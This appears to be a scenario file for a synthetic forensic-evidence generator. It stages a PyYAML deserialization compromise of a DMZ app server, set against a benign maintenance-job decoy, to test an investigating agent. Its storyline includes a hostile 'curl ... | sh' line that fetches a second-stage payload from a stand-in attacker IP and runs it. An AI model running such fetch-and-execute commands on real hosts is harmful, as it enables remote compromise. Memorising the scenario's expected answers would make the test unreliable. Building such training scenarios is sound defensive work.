version: "1.0"
name: pyyaml-rce-single-host
description: |
  Minimal single-host forensic case. A public Linux app server exposes a config-import
  endpoint that deserializes untrusted YAML with an unsafe loader. An external actor
  exploits it for remote code execution as the web service account, runs quick identity
  discovery, and fetches a second-stage payload over HTTP to attacker infrastructure.
  Low expectation: the agent should reconstruct initial access -> code execution ->
  outbound fetch from the correlated evidence, WITHOUT being told the vulnerability up
  front. Includes one benign look-alike (a scheduled maintenance job that also spawns a
  shell) and one deliberately undetermined fact (the second-stage payload contents).

environment:
  description: "Single-tenant Linux app server in a small DMZ, fronted by a perimeter firewall with a network SPAN sensor. No Active Directory."
  domain: "meridian-app.local"

  timezone:
    default: "UTC"

  users:
    - username: dan.oswald
      full_name: "Dan Oswald"
      email: "dan.oswald@meridian-app.example"
      persona: sysadmin
      primary_system: OPS-DOSWALD-01
      groups: ["it-admins"]
      enabled: true
      browsing_intensity: light

  service_accounts:
    - www-data
    - svc-deploy

  systems:
    - hostname: OPS-DOSWALD-01
      ip: "10.20.10.15"
      os: "Ubuntu 22.04 LTS"
      type: workstation
      assigned_user: dan.oswald
      services: ["dns-client", "ssh"]

    - hostname: APP-BO-01
      ip: "10.20.30.10"
      os: "Ubuntu 22.04 LTS"
      type: server
      services: ["nginx", "gunicorn", "ssh", "dns-client"]
      roles: ["web_server"]
      public_hostnames: ["config.meridian-app.example"]

  network:
    public_cidrs:
      - "203.0.113.0/28"

    segments:
      - name: ops
        cidr: "10.20.10.0/24"
        description: "Operator workstation segment"
        exposure: internal
        systems: [OPS-DOSWALD-01]

      - name: dmz
        cidr: "10.20.30.0/24"
        description: "DMZ hosting the public config portal"
        exposure: both
        external_ratio: 0.8
        systems: [APP-BO-01]

    sensors:
      - type: network
        name: core-span
        hostname: ZEEK-CORE
        monitoring_segments: [ops, dmz]
        direction: bidirectional
        placement: span
        log_formats: [zeek]
        description: "Core SPAN covering the DMZ app server and operator segment"

      - type: firewall
        name: edge-fw
        hostname: FW-EDGE
        monitoring_segments: [ops, dmz]
        direction: bidirectional
        placement: tap
        log_formats: [cisco_asa]
        interfaces:
          ops: inside
          dmz: dmz
        default_action: deny
        deny_ratio: 2.0
        threat_detection_rate: 10
        nat_rules:
          - type: dynamic_pat
            src: [ops]
            mapped_ip: "203.0.113.1"
          - type: static
            src: dmz
            real_ip: "10.20.30.10"
            mapped_ip: "203.0.113.5"
        policy:
          - {src: external, dst: dmz, ports: [80, 443], action: permit}
          - {src: dmz, dst: external, ports: [80, 443, 53], action: permit}
          - {src: ops, dst: dmz, ports: [22, 80, 443], action: permit}
          - {src: ops, dst: external, ports: [80, 443, 53], action: permit}

time_window:
  start: "2026-03-11T12:00:00Z"
  duration: "6h"
  warmup: "2h"

baseline_activity:
  description: "Quiet DMZ app server: healthchecks, occasional operator SSH, light public traffic to the portal, modest suspicious background noise."
  intensity: low
  variation: medium
  suspicious_noise: medium
  traffic_rates:
    web: low
    user_activity: low
    persona_connections: low

observation_profile: complete
logon_grace_period: "45m"

storyline:
  # --- Recon: external scan of the public portal ---
  - id: evt-001
    time: "+55m"
    actor: www-data
    system: APP-BO-01
    activity: "External scanner probes the public config portal"
    events:
      - type: web_scan
        technique: "T1595.002 - Active Scanning: Vulnerability Scanning"
        description: "Path/parameter probing that triggers web, Zeek HTTP, firewall, and IDS evidence"
        source_ip: "198.51.100.77"
        dst_ip: "203.0.113.5"
        dst_port: 80
        hostname: "config.meridian-app.example"
        preset: nikto
        rate: 4.0
        duration: "3m"

  # --- Initial access + execution: unsafe YAML deserialization -> RCE ---
  # NOTE: the web POST that carried the payload is authored below as a web_scan-adjacent
  # request; the CODE-EXECUTION proof is the process chain. The app-log traceback that
  # names the YAML constructor is NOT emitted by EvidenceForge and is authored separately
  # into data/ (see .key/ANSWERS.md). The engine gives us the process tree + network.
  - id: evt-002
    time: "+1h6m"
    actor: www-data
    system: APP-BO-01
    activity: "Exploitation of the config-import endpoint yields code execution as the web service account"
    events:
      # Initial access is carried by the process chain below, not a synthetic HTTP event.
      # The exploit POST to /api/v1/config/import renders in web_access/Zeek from the
      # recon web_scan + baseline traffic; the app-log traceback naming the YAML
      # constructor is authored separately into data/ (see .key/ANSWERS.md).
      - type: process
        technique: "T1190 - Exploit Public-Facing Application"
        description: "gunicorn worker spawns a shell — the RCE proof; parent is the python app process"
        process_name: "/bin/dash"
        command_line: "/bin/sh -c id; curl http://198.51.100.77/s | sh"
      - type: process
        technique: "T1033 - System Owner/User Discovery"
        process_name: "/usr/bin/id"
        command_line: "id"

  # --- C2: second-stage fetch over HTTP (contents undetermined by design) ---
  - id: evt-003
    time: "+1h6m"
    actor: www-data
    system: APP-BO-01
    activity: "Compromised app server fetches a second-stage payload from attacker infrastructure"
    events:
      - type: process
        technique: "T1105 - Ingress Tool Transfer"
        process_name: "/usr/bin/curl"
        command_line: "curl http://198.51.100.77/s"
      - type: connection
        technique: "T1105 - Ingress Tool Transfer"
        description: "Single outbound HTTP GET to attacker host; response body is not captured on the wire (contents undetermined by design)"
        dst_ip: "198.51.100.77"
        dst_port: 80
        service: http
        action: allow

red_herrings:
  # Benign look-alike: a scheduled maintenance job that ALSO spawns python -> shell.
  # Distinguishable by: service account svc-deploy (not www-data), no preceding external
  # HTTP, parent is the systemd timer (not the app worker), no outbound to untrusted IP.
  - id: rh-001
    time: "-1h"
    actor: svc-deploy
    system: APP-BO-01
    activity: "Nightly reindex maintenance job runs a python task that shells out to gzip"
    explanation: "Benign scheduled job that produces a python->sh->gzip process cluster resembling the attack chain"
    events:
      - type: process
        technique: "T1059.004 - Command and Scripting Interpreter: Unix Shell"
        process_name: "/usr/bin/python3"
        command_line: "python3 /opt/app/tasks/reindex.py"
      - type: process
        technique: "T1059.004 - Command and Scripting Interpreter: Unix Shell"
        process_name: "/bin/dash"
        command_line: "/bin/sh -c gzip -f /var/lib/app/index/shard0.tmp"

output:
  logs:
    - format: zeek
    - format: syslog
    - format: bash_history
    - format: cisco_asa
    - format: web_access
    - format: ecar
  destination: scenarios/pyyaml-rce-single-host
  compression: false
